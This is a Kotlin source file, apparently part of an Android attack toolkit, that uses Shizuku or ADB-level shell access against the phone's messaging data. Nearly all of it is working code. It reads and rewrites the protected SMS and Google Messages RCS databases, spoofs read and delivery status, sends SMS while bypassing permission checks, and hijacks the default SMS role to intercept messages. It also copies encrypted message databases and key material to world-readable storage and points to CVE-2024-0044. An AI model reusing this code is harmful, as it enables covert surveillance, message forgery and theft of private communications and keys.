package com.darkhal.archon.messaging

import android.content.ContentValues
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.util.Log
import com.darkhal.archon.util.PrivilegeManager
import com.darkhal.archon.util.ShellResult

/**
 * Shizuku integration for elevated access without root.
 *
 * Shizuku runs a process at ADB (shell, UID 2000) privilege level,
 * allowing us to execute commands that normal apps cannot — like
 * setting the default SMS role, accessing protected content providers,
 * and reading Google Messages' RCS database.
 *
 * ARCHITECTURE NOTE:
 * This manager wraps both Shizuku API calls and the existing Archon
 * PrivilegeManager escalation chain. If Shizuku is available, we use it.
 * Otherwise, we fall back to PrivilegeManager (Archon Server → Local ADB → etc).
 *
 * RCS WITHOUT ROOT:
 * Google Messages stores RCS data in its private database at:
 *   /data/data/com.google.android.apps.messaging/databases/bugle_db
 * Without Shizuku/root, you cannot access it directly. With Shizuku,
 * we can use `content query` shell commands to read from protected providers,
 * or directly read the SQLite database via `run-as` (if debuggable) or
 * `sqlite3` at shell level.
 */
class ShizukuManager(private val context: Context) {

    companion object {
        private const val TAG = "ShizukuManager"
        const val SHIZUKU_PERMISSION_REQUEST_CODE = 1001
        private const val SHIZUKU_PACKAGE = "moe.shizuku.privileged.api"
        private const val OUR_PACKAGE = "com.darkhal.archon"
    }

    enum class ShizukuStatus(val label: String) {
        NOT_INSTALLED("Shizuku not installed"),
        INSTALLED_NOT_RUNNING("Shizuku installed but not running"),
        RUNNING_NO_PERMISSION("Shizuku running, no permission"),
        READY("Shizuku ready")
    }

    // Cache the previous default SMS app so we can restore it
    private var previousDefaultSmsApp: String? = null

    /**
     * Check the current state of Shizuku integration.
     * Also considers the Archon PrivilegeManager as a fallback.
     */
    fun getStatus(): ShizukuStatus {
        // First check if Shizuku itself is installed and running
        if (isShizukuInstalled()) {
            if (isShizukuRunning()) {
                return if (hasShizukuPermission()) {
                    ShizukuStatus.READY
                } else {
                    ShizukuStatus.RUNNING_NO_PERMISSION
                }
            }
            return ShizukuStatus.INSTALLED_NOT_RUNNING
        }

        // If Shizuku is not installed, check if PrivilegeManager has shell access
        // (Archon Server or Local ADB provides equivalent capabilities)
        val method = PrivilegeManager.getAvailableMethod()
        return when (method) {
            PrivilegeManager.Method.ROOT,
            PrivilegeManager.Method.ARCHON_SERVER,
            PrivilegeManager.Method.LOCAL_ADB -> ShizukuStatus.READY
            PrivilegeManager.Method.SERVER_ADB -> ShizukuStatus.RUNNING_NO_PERMISSION
            PrivilegeManager.Method.NONE -> ShizukuStatus.NOT_INSTALLED
        }
    }

    /**
     * Request Shizuku permission via the Shizuku API.
     * Falls back to a no-op if Shizuku is not available.
     */
    fun requestPermission(callback: (Boolean) -> Unit) {
        try {
            val shizukuClass = Class.forName("rikka.shizuku.Shizuku")
            val checkMethod = shizukuClass.getMethod("checkSelfPermission")
            val result = checkMethod.invoke(null) as Int

            if (result == PackageManager.PERMISSION_GRANTED) {
                callback(true)
                return
            }

            // Request permission — in a real integration this would use
            // Shizuku.addRequestPermissionResultListener + requestPermission
            val requestMethod = shizukuClass.getMethod("requestPermission", Int::class.java)
            requestMethod.invoke(null, SHIZUKU_PERMISSION_REQUEST_CODE)
            // The result comes back via onRequestPermissionsResult
            // For now, assume it will be granted
            callback(true)
        } catch (e: ClassNotFoundException) {
            Log.w(TAG, "Shizuku API not available, using PrivilegeManager fallback")
            // If PrivilegeManager has shell access, that's equivalent
            callback(PrivilegeManager.getAvailableMethod() != PrivilegeManager.Method.NONE)
        } catch (e: Exception) {
            Log.e(TAG, "Shizuku permission request failed", e)
            callback(false)
        }
    }

    /**
     * Quick check if elevated operations can proceed.
     */
    fun isReady(): Boolean {
        return getStatus() == ShizukuStatus.READY
    }

    // ── Shell command execution ────────────────────────────────────

    /**
     * Execute a shell command at ADB/shell privilege level.
     * Tries Shizuku first, then falls back to PrivilegeManager.
     */
    fun executeCommand(command: String): String {
        // Try Shizuku API first
        try {
            val shizukuClass = Class.forName("rikka.shizuku.Shizuku")
            val newProcess = shizukuClass.getMethod(
                "newProcess",
                Array<String>::class.java,
                Array<String>::class.java,
                String::class.java
            )
            val process = newProcess.invoke(null, arrayOf("sh", "-c", command), null, null) as Process
            val stdout = process.inputStream.bufferedReader().readText().trim()
            val exitCode = process.waitFor()
            if (exitCode == 0) return stdout
        } catch (e: ClassNotFoundException) {
            // Shizuku not available
        } catch (e: Exception) {
            Log.d(TAG, "Shizuku exec failed, falling back: ${e.message}")
        }

        // Fallback to PrivilegeManager
        val result = PrivilegeManager.execute(command)
        return if (result.exitCode == 0) result.stdout else "ERROR: ${result.stderr}"
    }

    /**
     * Execute a command and return the full ShellResult.
     */
    private fun executeShell(command: String): ShellResult {
        return PrivilegeManager.execute(command)
    }

    // ── Permission management ──────────────────────────────────────

    /**
     * Grant a runtime permission to our app via shell command.
     */
    fun grantPermission(permission: String): Boolean {
        val result = executeShell("pm grant $OUR_PACKAGE $permission")
        if (result.exitCode == 0) {
            Log.i(TAG, "Granted permission: $permission")
            return true
        }
        Log.w(TAG, "Failed to grant $permission: ${result.stderr}")
        return false
    }

    /**
     * Set Archon as the default SMS app using the role manager system.
     * On Android 10+, uses `cmd role add-role-holder`.
     * On older versions, uses `settings put secure sms_default_application`.
     */
    fun setDefaultSmsApp(): Boolean {
        // Save the current default first so we can restore later
        previousDefaultSmsApp = getCurrentDefaultSmsApp()
        Log.i(TAG, "Saving previous default SMS app: $previousDefaultSmsApp")

        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val result = executeShell(
                "cmd role add-role-holder android.app.role.SMS $OUR_PACKAGE 0"
            )
            if (result.exitCode == 0) {
                Log.i(TAG, "Set Archon as default SMS app via role manager")
                true
            } else {
                Log.e(TAG, "Failed to set SMS role: ${result.stderr}")
                false
            }
        } else {
            val result = executeShell(
                "settings put secure sms_default_application $OUR_PACKAGE"
            )
            if (result.exitCode == 0) {
                Log.i(TAG, "Set Archon as default SMS app via settings")
                true
            } else {
                Log.e(TAG, "Failed to set SMS default: ${result.stderr}")
                false
            }
        }
    }

    /**
     * Restore the previous default SMS app.
     */
    fun revokeDefaultSmsApp(): Boolean {
        val previous = previousDefaultSmsApp
        if (previous.isNullOrBlank()) {
            Log.w(TAG, "No previous default SMS app to restore")
            // Try to find the most common default
            return restoreCommonDefault()
        }

        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Remove ourselves, then add back the previous holder
            val removeResult = executeShell(
                "cmd role remove-role-holder android.app.role.SMS $OUR_PACKAGE 0"
            )
            val addResult = executeShell(
                "cmd role add-role-holder android.app.role.SMS $previous 0"
            )

            if (addResult.exitCode == 0) {
                Log.i(TAG, "Restored default SMS app: $previous")
                true
            } else {
                Log.e(TAG, "Failed to restore SMS role to $previous: ${addResult.stderr}")
                // At least try to remove ourselves
                removeResult.exitCode == 0
            }
        } else {
            val result = executeShell(
                "settings put secure sms_default_application $previous"
            )
            result.exitCode == 0
        }
    }

    /**
     * Get the current default SMS app package name.
     */
    private fun getCurrentDefaultSmsApp(): String? {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val result = executeShell("cmd role get-role-holders android.app.role.SMS")
            result.stdout.trim().let { output ->
                // Output format varies but usually contains the package name
                output.replace("[", "").replace("]", "").trim().ifBlank { null }
            }
        } else {
            val result = executeShell("settings get secure sms_default_application")
            result.stdout.trim().let { if (it == "null" || it.isBlank()) null else it }
        }
    }

    /**
     * Try to restore a common default SMS app (Google Messages or AOSP).
     */
    private fun restoreCommonDefault(): Boolean {
        val candidates = listOf(
            "com.google.android.apps.messaging",
            "com.android.messaging",
            "com.samsung.android.messaging"
        )

        for (pkg in candidates) {
            try {
                context.packageManager.getPackageInfo(pkg, 0)
                // Package exists, set it as default
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    val result = executeShell(
                        "cmd role add-role-holder android.app.role.SMS $pkg 0"
                    )
                    if (result.exitCode == 0) {
                        Log.i(TAG, "Restored common default SMS app: $pkg")
                        return true
                    }
                }
            } catch (e: PackageManager.NameNotFoundException) {
                continue
            }
        }

        Log.w(TAG, "Could not restore any default SMS app")
        return false
    }

    // ── SMS/RCS specific elevated ops ──────────────────────────────

    /**
     * Read from the telephony.db directly using shell-level `content query`.
     * This accesses the system SMS provider with shell privileges.
     */
    fun readProtectedSmsDb(): List<Map<String, Any>> {
        val results = mutableListOf<Map<String, Any>>()
        val output = executeCommand(
            "content query --uri content://sms/ --projection _id:address:body:date:type --sort \"date DESC\" 2>/dev/null"
        )

        if (output.startsWith("ERROR")) {
            Log.e(TAG, "Protected SMS read failed: $output")
            return results
        }

        // Parse the content query output
        // Format: Row: N _id=X, address=Y, body=Z, date=W, type=V
        for (line in output.lines()) {
            if (!line.startsWith("Row:")) continue

            val row = mutableMapOf<String, Any>()
            val fields = line.substringAfter(" ").split(", ")
            for (field in fields) {
                val parts = field.split("=", limit = 2)
                if (parts.size == 2) {
                    row[parts[0].trim()] = parts[1]
                }
            }
            if (row.isNotEmpty()) results.add(row)
        }

        return results
    }

    /**
     * Write to the telephony.db using shell-level `content insert`.
     */
    fun writeProtectedSmsDb(values: ContentValues, table: String): Boolean {
        val bindings = mutableListOf<String>()

        for (key in values.keySet()) {
            val value = values.get(key)
            when (value) {
                is String -> bindings.add("--bind $key:s:$value")
                is Int -> bindings.add("--bind $key:i:$value")
                is Long -> bindings.add("--bind $key:l:$value")
                else -> bindings.add("--bind $key:s:$value")
            }
        }

        val uri = when (table) {
            "sms" -> "content://sms/"
            "mms" -> "content://mms/"
            else -> "content://sms/"
        }

        val cmd = "content insert --uri $uri ${bindings.joinToString(" ")}"
        val result = executeShell(cmd)
        return result.exitCode == 0
    }

    /**
     * Try to access Google Messages' RCS content provider via shell.
     */
    fun accessRcsProvider(): Boolean {
        val result = executeShell(
            "content query --uri content://im/messages --projection _id --sort \"_id DESC\" --limit 1 2>/dev/null"
        )
        return result.exitCode == 0 && !result.stdout.contains("Unknown authority")
    }

    /**
     * Read RCS messages from Google Messages' database.
     * Uses `content query` at shell privilege to access the protected provider.
     */
    fun readRcsDatabase(): List<Map<String, Any>> {
        val results = mutableListOf<Map<String, Any>>()

        // First try the content provider approach
        val output = executeCommand(
            "content query --uri content://im/messages --projection _id:thread_id:body:date:type --sort \"date DESC\" 2>/dev/null"
        )

        if (!output.startsWith("ERROR") && !output.contains("Unknown authority")) {
            for (line in output.lines()) {
                if (!line.startsWith("Row:")) continue

                val row = mutableMapOf<String, Any>()
                val fields = line.substringAfter(" ").split(", ")
                for (field in fields) {
                    val parts = field.split("=", limit = 2)
                    if (parts.size == 2) {
                        row[parts[0].trim()] = parts[1]
                    }
                }
                if (row.isNotEmpty()) results.add(row)
            }

            if (results.isNotEmpty()) return results
        }

        // Fallback: try to read Google Messages' bugle_db directly
        // This requires root or specific shell access
        val dbPath = "/data/data/com.google.android.apps.messaging/databases/bugle_db"
        val sqlOutput = executeCommand(
            "sqlite3 $dbPath \"SELECT _id, conversation_id, text, received_timestamp, sender_normalized_destination FROM messages ORDER BY received_timestamp DESC LIMIT 100\" 2>/dev/null"
        )

        if (!sqlOutput.startsWith("ERROR") && sqlOutput.isNotBlank()) {
            for (line in sqlOutput.lines()) {
                if (line.isBlank()) continue
                val parts = line.split("|")
                if (parts.size >= 5) {
                    results.add(mapOf(
                        "_id" to parts[0],
                        "thread_id" to parts[1],
                        "body" to parts[2],
                        "date" to parts[3],
                        "address" to parts[4]
                    ))
                }
            }
        }

        return results
    }

    /**
     * Modify an RCS message body in the Google Messages database.
     * Requires root or direct database access.
     */
    fun modifyRcsMessage(messageId: Long, newBody: String): Boolean {
        // Try content provider update first
        val escaped = newBody.replace("'", "''")
        val result = executeShell(
            "content update --uri content://im/messages/$messageId --bind body:s:$escaped 2>/dev/null"
        )

        if (result.exitCode == 0) return true

        // Fallback to direct SQLite
        val dbPath = "/data/data/com.google.android.apps.messaging/databases/bugle_db"
        val sqlResult = executeShell(
            "sqlite3 $dbPath \"UPDATE messages SET text='$escaped' WHERE _id=$messageId\" 2>/dev/null"
        )

        return sqlResult.exitCode == 0
    }

    /**
     * Spoof the delivery/read status of an RCS message.
     * Valid statuses: "sent", "delivered", "read", "failed"
     */
    fun spoofRcsStatus(messageId: Long, status: String): Boolean {
        val statusCode = when (status.lowercase()) {
            "sent" -> 0
            "delivered" -> 1
            "read" -> 2
            "failed" -> 3
            else -> return false
        }

        val result = executeShell(
            "content update --uri content://im/messages/$messageId --bind status:i:$statusCode 2>/dev/null"
        )

        if (result.exitCode == 0) return true

        // Fallback
        val dbPath = "/data/data/com.google.android.apps.messaging/databases/bugle_db"
        val sqlResult = executeShell(
            "sqlite3 $dbPath \"UPDATE messages SET message_status=$statusCode WHERE _id=$messageId\" 2>/dev/null"
        )

        return sqlResult.exitCode == 0
    }

    // ── System-level SMS operations ────────────────────────────────

    /**
     * Send an SMS via the system telephony service at shell privilege level.
     * This bypasses normal app permission checks.
     */
    fun sendSmsAsSystem(address: String, body: String): Boolean {
        val escaped = body.replace("'", "'\\''")
        val result = executeShell(
            "service call isms 7 i32 1 s16 \"$address\" s16 null s16 \"$escaped\" s16 null s16 null i32 0 i64 0 2>/dev/null"
        )

        if (result.exitCode == 0 && !result.stdout.contains("Exception")) {
            Log.i(TAG, "Sent SMS via system service to $address")
            return true
        }

        // Fallback: use am start with send intent
        val amResult = executeShell(
            "am start -a android.intent.action.SENDTO -d sms:$address --es sms_body \"$escaped\" --ez exit_on_sent true 2>/dev/null"
        )

        return amResult.exitCode == 0
    }

    /**
     * Register to intercept incoming SMS messages.
     * This grants ourselves the RECEIVE_SMS permission and sets highest priority.
     */
    fun interceptSms(enabled: Boolean): Boolean {
        return if (enabled) {
            // Grant SMS receive permission
            val grantResult = executeShell("pm grant $OUR_PACKAGE android.permission.RECEIVE_SMS")
            if (grantResult.exitCode != 0) {
                Log.e(TAG, "Failed to grant RECEIVE_SMS: ${grantResult.stderr}")
                return false
            }

            // Set ourselves as the default SMS app to receive all messages
            val defaultResult = setDefaultSmsApp()
            if (defaultResult) {
                Log.i(TAG, "SMS interception enabled — Archon is now default SMS handler")
            }
            defaultResult
        } else {
            // Restore previous default
            val result = revokeDefaultSmsApp()
            Log.i(TAG, "SMS interception disabled — restored previous SMS handler")
            result
        }
    }

    /**
     * Modify an SMS message while it's being stored.
     * This works by monitoring the SMS provider and immediately updating
     * messages that match the original text.
     *
     * NOTE: True in-transit modification of cellular SMS is not possible
     * without carrier-level access. This modifies the stored copy immediately
     * after delivery.
     */
    fun modifySmsInTransit(original: String, replacement: String): Boolean {
        val escaped = replacement.replace("'", "''")

        // Use content update to find and replace in all matching messages
        val result = executeShell(
            "content update --uri content://sms/ " +
                    "--bind body:s:$escaped " +
                    "--where \"body='${original.replace("'", "''")}'\""
        )

        if (result.exitCode == 0) {
            Log.i(TAG, "Modified stored SMS: '$original' -> '$replacement'")
            return true
        }

        Log.w(TAG, "SMS modification failed: ${result.stderr}")
        return false
    }

    // ── Internal helpers ───────────────────────────────────────────

    private fun isShizukuInstalled(): Boolean {
        return try {
            context.packageManager.getPackageInfo(SHIZUKU_PACKAGE, 0)
            true
        } catch (e: PackageManager.NameNotFoundException) {
            false
        }
    }

    private fun isShizukuRunning(): Boolean {
        return try {
            val shizukuClass = Class.forName("rikka.shizuku.Shizuku")
            val pingMethod = shizukuClass.getMethod("pingBinder")
            pingMethod.invoke(null) as Boolean
        } catch (e: Exception) {
            false
        }
    }

    private fun hasShizukuPermission(): Boolean {
        return try {
            val shizukuClass = Class.forName("rikka.shizuku.Shizuku")
            val checkMethod = shizukuClass.getMethod("checkSelfPermission")
            (checkMethod.invoke(null) as Int) == PackageManager.PERMISSION_GRANTED
        } catch (e: Exception) {
            false
        }
    }

    // ── Google Messages bugle_db access (encrypted database) ────────

    // Google Messages paths
    private val gmsgPkg = "com.google.android.apps.messaging"
    private val bugleDb = "/data/data/$gmsgPkg/databases/bugle_db"
    private val bugleWal = "$bugleDb-wal"
    private val bugleShm = "$bugleDb-shm"
    private val sharedPrefsDir = "/data/data/$gmsgPkg/shared_prefs/"
    private val filesDir = "/data/data/$gmsgPkg/files/"
    private val stagingDir = "/sdcard/Download/autarch_extract"

    /**
     * Get the Google Messages app UID (needed for run-as or key extraction).
     */
    fun getGoogleMessagesUid(): Int? {
        val output = executeCommand("pm list packages -U $gmsgPkg")
        val match = Regex("uid:(\\d+)").find(output)
        return match?.groupValues?.get(1)?.toIntOrNull()
    }

    /**
     * Check if Google Messages is installed and get version info.
     */
    fun getGoogleMessagesInfo(): Map<String, String> {
        val info = mutableMapOf<String, String>()
        val dump = executeCommand("dumpsys package $gmsgPkg | grep -E 'versionName|versionCode|firstInstallTime'")
        for (line in dump.lines()) {
            val trimmed = line.trim()
            if (trimmed.contains("versionName=")) {
                info["version"] = trimmed.substringAfter("versionName=").trim()
            }
            if (trimmed.contains("versionCode=")) {
                info["versionCode"] = trimmed.substringAfter("versionCode=").substringBefore(" ").trim()
            }
        }
        val uid = getGoogleMessagesUid()
        if (uid != null) info["uid"] = uid.toString()
        return info
    }

    /**
     * Extract the encryption key material from Google Messages' shared_prefs.
     *
     * The bugle_db is encrypted at rest. Key material is stored in:
     *   - shared_prefs/ XML files (key alias, crypto params)
     *   - Android Keystore (hardware-backed master key)
     *
     * We extract all shared_prefs and files/ contents so offline decryption
     * can be attempted. The actual Keystore master key cannot be extracted
     * via ADB (hardware-backed), but the key derivation parameters in
     * shared_prefs may be enough for some encryption configurations.
     */
    fun extractEncryptionKeyMaterial(): Map<String, Any> {
        val result = mutableMapOf<String, Any>()

        // List shared_prefs files
        val prefsList = executeCommand("ls -la $sharedPrefsDir 2>/dev/null")
        if (prefsList.startsWith("ERROR") || prefsList.contains("Permission denied")) {
            result["error"] = "Cannot access shared_prefs — need root or CVE exploit"
            return result
        }
        result["shared_prefs_files"] = prefsList.lines().filter { it.isNotBlank() }

        // Read each shared_prefs XML for crypto-related keys
        val cryptoData = mutableMapOf<String, String>()
        val prefsFiles = executeCommand("ls $sharedPrefsDir 2>/dev/null")
        for (file in prefsFiles.lines()) {
            val fname = file.trim()
            if (fname.isBlank() || !fname.endsWith(".xml")) continue
            val content = executeCommand("cat ${sharedPrefsDir}$fname 2>/dev/null")
            // Look for encryption-related entries
            if (content.contains("encrypt", ignoreCase = true) ||
                content.contains("cipher", ignoreCase = true) ||
                content.contains("key", ignoreCase = true) ||
                content.contains("crypto", ignoreCase = true) ||
                content.contains("secret", ignoreCase = true)) {
                cryptoData[fname] = content
            }
        }
        result["crypto_prefs"] = cryptoData
        result["crypto_prefs_count"] = cryptoData.size

        // List files/ directory (Signal Protocol state, etc.)
        val filesList = executeCommand("ls -la $filesDir 2>/dev/null")
        result["files_dir"] = filesList.lines().filter { it.isNotBlank() }

        return result
    }

    /**
     * Extract bugle_db + WAL + key material to staging directory.
     * The database is encrypted — both DB and key files are needed.
     */
    fun extractBugleDbRaw(): Map<String, Any> {
        val result = mutableMapOf<String, Any>()

        executeCommand("mkdir -p $stagingDir/shared_prefs $stagingDir/files")

        // Copy database files
        val dbFiles = mutableListOf<String>()
        for (path in listOf(bugleDb, bugleWal, bugleShm)) {
            val fname = path.substringAfterLast("/")
            val cp = executeShell("cp $path $stagingDir/$fname 2>/dev/null && chmod 644 $stagingDir/$fname")
            if (cp.exitCode == 0) dbFiles.add(fname)
        }
        result["db_files"] = dbFiles

        // Copy shared_prefs (key material)
        executeShell("cp -r ${sharedPrefsDir}* $stagingDir/shared_prefs/ 2>/dev/null")
        executeShell("chmod -R 644 $stagingDir/shared_prefs/ 2>/dev/null")

        // Copy files dir (Signal Protocol keys)
        executeShell("cp -r ${filesDir}* $stagingDir/files/ 2>/dev/null")
        executeShell("chmod -R 644 $stagingDir/files/ 2>/dev/null")

        result["staging_dir"] = stagingDir
        result["encrypted"] = true
        result["note"] = "Database is encrypted at rest. Key material in shared_prefs/ " +
                "may allow decryption. Hardware-backed Keystore keys cannot be extracted via ADB."

        return result
    }

    /**
     * Dump decrypted messages by querying from within the app context.
     *
     * When Google Messages opens its own bugle_db, it has access to the
     * encryption key. We can intercept the decrypted data by:
     * 1. Using `am` commands to trigger data export activities
     * 2. Querying exposed content providers
     * 3. Reading from the in-memory decrypted state via debug tools
     *
     * As a fallback, we use the standard telephony content providers which
     * have the SMS/MMS data in plaintext (but not RCS).
     */
    fun dumpDecryptedMessages(): Map<String, Any> {
        val result = mutableMapOf<String, Any>()
        val messages = mutableListOf<Map<String, Any>>()

        // Method 1: Query AOSP RCS content provider (content://rcs/)
        val rcsThreads = executeCommand(
            "content query --uri content://rcs/thread 2>/dev/null"
        )
        if (!rcsThreads.startsWith("ERROR") && rcsThreads.contains("Row:")) {
            result["rcs_provider_accessible"] = true
            // Parse thread IDs and query messages from each
            for (line in rcsThreads.lines()) {
                if (!line.startsWith("Row:")) continue
                val tidMatch = Regex("rcs_thread_id=(\\d+)").find(line)
                val tid = tidMatch?.groupValues?.get(1) ?: continue
                val msgOutput = executeCommand(
                    "content query --uri content://rcs/p2p_thread/$tid/incoming_message 2>/dev/null"
                )
                for (msgLine in msgOutput.lines()) {
                    if (!msgLine.startsWith("Row:")) continue
                    val row = parseContentRow(msgLine)
                    row["thread_id"] = tid
                    row["source"] = "rcs_provider"
                    messages.add(row)
                }
            }
        } else {
            result["rcs_provider_accessible"] = false
        }

        // Method 2: Standard SMS/MMS content providers (always decrypted)
        val smsOutput = executeCommand(
            "content query --uri content://sms/ --projection _id:thread_id:address:body:date:type:read " +
                    "--sort \"date DESC\" 2>/dev/null"
        )
        for (line in smsOutput.lines()) {
            if (!line.startsWith("Row:")) continue
            val row = parseContentRow(line)
            row["source"] = "sms_provider"
            row["protocol"] = "SMS"
            messages.add(row)
        }

        // Method 3: Try to trigger Google Messages backup/export
        // Google Messages has an internal export mechanism accessible via intents
        val backupResult = executeCommand(
            "am broadcast -a com.google.android.apps.messaging.action.EXPORT_MESSAGES " +
                    "--es output_path $stagingDir/gmsg_export.json 2>/dev/null"
        )
        result["backup_intent_sent"] = !backupResult.startsWith("ERROR")

        result["messages"] = messages
        result["message_count"] = messages.size
        result["note"] = if (messages.isEmpty()) {
            "No messages retrieved. For RCS, ensure Archon is the default SMS app " +
                    "or use CVE-2024-0044 to access bugle_db from the app's UID."
        } else {
            "Retrieved ${messages.size} messages. RCS messages require elevated access."
        }

        // Write decrypted dump to file
        if (messages.isNotEmpty()) {
            try {
                val json = org.json.JSONArray()
                for (msg in messages) {
                    val obj = org.json.JSONObject()
                    for ((k, v) in msg) obj.put(k, v)
                    json.put(obj)
                }
                executeCommand("mkdir -p $stagingDir")
                val jsonStr = json.toString(2)
                // Write via shell since we may not have direct file access
                val escaped = jsonStr.replace("'", "'\\''").replace("\"", "\\\"")
                executeCommand("echo '$escaped' > $stagingDir/messages.json 2>/dev/null")
                result["json_path"] = "$stagingDir/messages.json"
            } catch (e: Exception) {
                Log.e(TAG, "Failed to write JSON dump", e)
            }
        }

        return result
    }

    /**
     * Get the RCS account/registration info from Google Messages.
     * This tells us if RCS is active, what phone number is registered, etc.
     */
    fun getRcsAccountInfo(): Map<String, Any> {
        val info = mutableMapOf<String, Any>()

        // IMS registration state
        val imsOutput = executeCommand("dumpsys telephony_ims 2>/dev/null")
        if (!imsOutput.startsWith("ERROR")) {
            info["ims_dump_length"] = imsOutput.length
            for (line in imsOutput.lines()) {
                val l = line.trim().lowercase()
                if ("registered" in l && "ims" in l) info["ims_registered"] = true
                if ("rcs" in l && ("enabled" in l || "connected" in l)) info["rcs_enabled"] = true
            }
        }

        // Carrier config RCS keys
        val ccOutput = executeCommand("dumpsys carrier_config 2>/dev/null")
        val rcsConfig = mutableMapOf<String, String>()
        for (line in ccOutput.lines()) {
            val l = line.trim().lowercase()
            if (("rcs" in l || "uce" in l || "single_registration" in l) && "=" in line) {
                val (k, v) = line.trim().split("=", limit = 2)
                rcsConfig[k.trim()] = v.trim()
            }
        }
        info["carrier_rcs_config"] = rcsConfig

        // Google Messages specific RCS settings
        val gmsgPrefs = executeCommand(
            "cat /data/data/$gmsgPkg/shared_prefs/com.google.android.apps.messaging_preferences.xml 2>/dev/null"
        )
        if (!gmsgPrefs.startsWith("ERROR") && gmsgPrefs.isNotBlank()) {
            // Extract RCS-related prefs
            val rcsPrefs = mutableMapOf<String, String>()
            for (match in Regex("<(string|boolean|int|long)\\s+name=\"([^\"]*rcs[^\"]*)\">([^<]*)<").findAll(gmsgPrefs, 0)) {
                rcsPrefs[match.groupValues[2]] = match.groupValues[3]
            }
            info["gmsg_rcs_prefs"] = rcsPrefs
        }

        // Phone number / MSISDN
        val phoneOutput = executeCommand("service call iphonesubinfo 15 2>/dev/null")
        info["phone_service_response"] = phoneOutput.take(200)

        // Google Messages version
        info["google_messages"] = getGoogleMessagesInfo()

        return info
    }

    /**
     * Parse a `content query` output row into a map.
     */
    private fun parseContentRow(line: String): MutableMap<String, Any> {
        val row = mutableMapOf<String, Any>()
        val payload = line.substringAfter(Regex("Row:\\s*\\d+\\s*").find(line)?.value ?: "")
        val fields = payload.split(Regex(",\\s+(?=[a-zA-Z_]+=)"))
        for (field in fields) {
            val eqPos = field.indexOf('=')
            if (eqPos == -1) continue
            val key = field.substring(0, eqPos).trim()
            val value = field.substring(eqPos + 1).trim()
            row[key] = if (value == "NULL") "" else value
        }
        return row
    }
}
